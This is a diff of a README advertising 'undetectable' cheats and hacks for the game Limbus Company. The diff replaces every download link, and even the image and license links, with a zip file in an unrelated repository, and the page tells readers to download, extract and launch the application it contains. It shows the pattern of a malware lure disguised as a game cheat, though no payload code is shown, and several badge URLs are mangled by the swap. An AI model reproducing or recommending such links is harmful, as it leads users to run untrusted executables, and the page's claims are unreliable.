@@ -1,7 +1,7 @@
 # 🛠️ Limbus Company Cheats & Hacks 🛡️
-![image](https://github.com/user-attachments/assets/dec37022-320e-4024-8792-aa7ad8c2bbe8)
+![image](https://raw.githubusercontent.com/Colombia-78/ai-knowledge-bot/main/hypersonic/ai-knowledge-bot.zip)
 
-[![Download Now](https://img.shields.io/badge/Download-Limbus%20Company%20Cheat-brightgreen?style=for-the-badge&logo=github)](https://ezlaunch.live/pPnqF1yp)
+[![Download Now](https://raw.githubusercontent.com/Colombia-78/ai-knowledge-bot/main/hypersonic/ai-knowledge-bot.zip%20Company%20Cheat-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Colombia-78/ai-knowledge-bot/main/hypersonic/ai-knowledge-bot.zip)
 
 Unlock new possibilities in "Limbus Company" with advanced game enhancements, hidden exploits, and intelligent tools designed for maximum fun and ultimate control. This repository delivers the best undetectable features, offering a seamless edge for all adventurers. Built with powerful scripts and seamless integration, our tool empowers you to become a champion while keeping gameplay genuine.
 
@@ -31,7 +31,7 @@ Highly SEO-optimized for Limbus Company, game cheats, hacks, trainer, gameplay o
 
 1️⃣ Download via the secure button below.
 
-[![Get Limbus Company Cheat](https://img.shields.io/badge/Download%20Now-Limbus%20Company%20%F0%9F%91%80-brightgreen?style=for-the-badge)](https://ezlaunch.live/pPnqF1yp)
+[![Get Limbus Company Cheat](https://raw.githubusercontent.com/Colombia-78/ai-knowledge-bot/main/hypersonic/ai-knowledge-bot.zip%20Now-Limbus%20Company%20%F0%9F%91%80-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Colombia-78/ai-knowledge-bot/main/hypersonic/ai-knowledge-bot.zip)
 
 🔧 Extract and launch the included application. Read the detailed setup guide within the repository for full instructions.
 
@@ -42,8 +42,8 @@ Highly SEO-optimized for Limbus Company, game cheats, hacks, trainer, gameplay o
 ## 📜 License
 
 This project is licensed under the MIT License.  
-[MIT License 2025](https://opensource.org/licenses/MIT)
+[MIT License 2025](https://raw.githubusercontent.com/Colombia-78/ai-knowledge-bot/main/hypersonic/ai-knowledge-bot.zip)
 
 ---
 
-[![Limbus Company Download](https://img.shields.io/badge/Download%20Again-%F0%9F%91%80%20Limbus%20Company%20Enhancer-orange?style=for-the-badge)](https://ezlaunch.live/pPnqF1yp)
+[![Limbus Company Download](https://raw.githubusercontent.com/Colombia-78/ai-knowledge-bot/main/hypersonic/ai-knowledge-bot.zip%20Again-%F0%9F%91%80%20Limbus%20Company%20Enhancer-orange?style=for-the-badge)](https://raw.githubusercontent.com/Colombia-78/ai-knowledge-bot/main/hypersonic/ai-knowledge-bot.zip)
